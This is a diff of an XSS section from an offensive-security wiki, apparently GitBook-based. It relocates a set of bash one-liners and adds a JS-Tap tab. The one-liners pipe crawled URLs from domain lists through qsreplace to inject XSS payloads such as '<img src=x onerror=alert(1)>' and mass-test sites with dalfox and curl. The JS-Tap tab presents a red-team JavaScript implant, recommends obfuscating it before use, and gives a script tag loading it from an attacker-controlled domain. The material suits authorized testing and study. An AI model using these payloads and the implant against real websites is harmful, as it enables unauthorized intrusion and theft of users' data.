@@ -15,6 +15,37 @@ There are three major types of XSS:
 ### Tools
 
 {% tabs %}
+{% tab title="One-Liners" %}
+Here are some handy one-liners to automate XSS scans on domains using tools like [gau](https://github.com/lc/gau), [hakrawler](https://github.com/hakluke/hakrawler), [waybackurls](https://github.com/tomnomnom/waybackurls), [katana](https://github.com/projectdiscovery/katana), [uro](https://github.com/s0md3v/uro), [qsreplace](https://github.com/tomnomnom/qsreplace), [httpx](https://github.com/projectdiscovery/httpx), [Gxss](https://github.com/KathanP19/Gxss), [Dalfox](https://github.com/hahwul/dalfox), [Gospider](https://github.com/jaeles-project/gospider).
+
+{% hint style="success" %}
+It may be usefull for bug bounty hunting
+{% endhint %}
+
+{% hint style="info" %}
+**domains.txt** -> text file containing domain names (ex: test.domain.com)
+
+**urls.txt** -> text file containing URLs (ex: http://test.domain.com)
+{% endhint %}
+
+```bash
+# HTTPX
+cat domains.txt | (gau || hakrawler || waybackurls || katana) | grep -Ev "\.(jpeg|jpg|png|ico|gif|css|woff|svg)$" | uro | grep =  | qsreplace "<img src=x onerror=alert(1)>" | httpx -silent -nc -mc 200 -mr "<img src=x onerror=alert(1)>"
+
+# Dalfox
+cat domains.txt | (gau || hakrawler || waybackurls || katana) | httpx -silent | Gxss -c 100 -p Xss | sort -u |grep http| dalfox pipe
+
+# Curl
+cat domains.txt | (gau || hakrawler || waybackurls || katana) | grep '=' |qsreplace '"><script>alert(1)</script>' | while read host do ; do curl -s --path-as-is --insecure "$host" | grep -qs "<script>alert(1)</script>" && echo "$host \033[0;31m" Vulnerable "\033[0m";done
+
+# URLS and Dalfox
+gospider -S urls.txt -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}'| grep "=" | qsreplace -a | dalfox pipe
+
+# Dalfox, gf
+cat domains.txt | (gau || hakrawler || waybackurls || katana) | grep '=' | gf xss | sed 's/=.*/=/' | sort -u | dalfox pipe
+```
+{% endtab %}
+
 {% tab title="XSStrike" %}
 [XSStrike](https://github.com/s0md3v/XSStrike) (Python) can be used to scan website for XSS
 
@@ -67,34 +98,23 @@ On the target side, XSS payload should looks like:
 ```
 {% endtab %}
 
-{% tab title="One-Liners" %}
-Here are some handy one-liners to automate XSS scans on domains using tools like [gau](https://github.com/lc/gau), [hakrawler](https://github.com/hakluke/hakrawler), [waybackurls](https://github.com/tomnomnom/waybackurls), [katana](https://github.com/projectdiscovery/katana), [uro](https://github.com/s0md3v/uro), [qsreplace](https://github.com/tomnomnom/qsreplace), [httpx](https://github.com/projectdiscovery/httpx), [Gxss](https://github.com/KathanP19/Gxss), [Dalfox](https://github.com/hahwul/dalfox), [Gospider](https://github.com/jaeles-project/gospider).
+{% tab title="JS-Tap" %}
+[JS-Tap](https://github.com/hoodoer/JS-Tap) is a generic JavaScript payload and supporting software to help red teamers attack webapps. The JS-Tap payload can be used as an XSS payload or as a post exploitation implant.
 
-{% hint style="success" %}
-It may be usefull for bug bounty hunting
-{% endhint %}
-
-{% hint style="info" %}
-**domains.txt** -> text file containing domain names (ex: test.domain.com)
-
-**urls.txt** -> text file containing URLs (ex: http://test.domain.com)
-{% endhint %}
+The JS-Tap payload is contained in the `telemlib.js` file. This file has not been obfuscated. Prior to using in an engagement strongly consider changing the naming of endpoints, stripping comments, and highly obfuscating the payload.
 
 ```bash
-# HTTPX
-cat domains.txt | (gau || hakrawler || waybackurls || katana) | grep -Ev "\.(jpeg|jpg|png|ico|gif|css|woff|svg)$" | uro | grep =  | qsreplace "<img src=x onerror=alert(1)>" | httpx -silent -nc -mc 200 -mr "<img src=x onerror=alert(1)>"
+# Configure nginx and payload as proxy
+# https://trustedsec.com/blog/js-tap-mark-ii-now-with-c2-shenanigans
 
-# Dalfox
-cat domains.txt | (gau || hakrawler || waybackurls || katana) | httpx -silent | Gxss -c 100 -p Xss | sort -u |grep http| dalfox pipe
+# Edit payload conf and jsTapServer.py, Start JS-Tap server
+./jstapRun.sh
+```
 
-# Curl
-cat domains.txt | (gau || hakrawler || waybackurls || katana) | grep '=' |qsreplace '"><script>alert(1)</script>' | while read host do ; do curl -s --path-as-is --insecure "$host" | grep -qs "<script>alert(1)</script>" && echo "$host \033[0;31m" Vulnerable "\033[0m";done
+On the target side, XSS payload should looks like:
 
-# URLS and Dalfox
-gospider -S urls.txt -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}'| grep "=" | qsreplace -a | dalfox pipe
-
-# Dalfox, gf
-cat domains.txt | (gau || hakrawler || waybackurls || katana) | grep '=' | gf xss | sed 's/=.*/=/' | sort -u | dalfox pipe
+```html
+<script url="https://your.domain.com/telemlib.js"></script>
 ```
 {% endtab %}
 {% endtabs %}
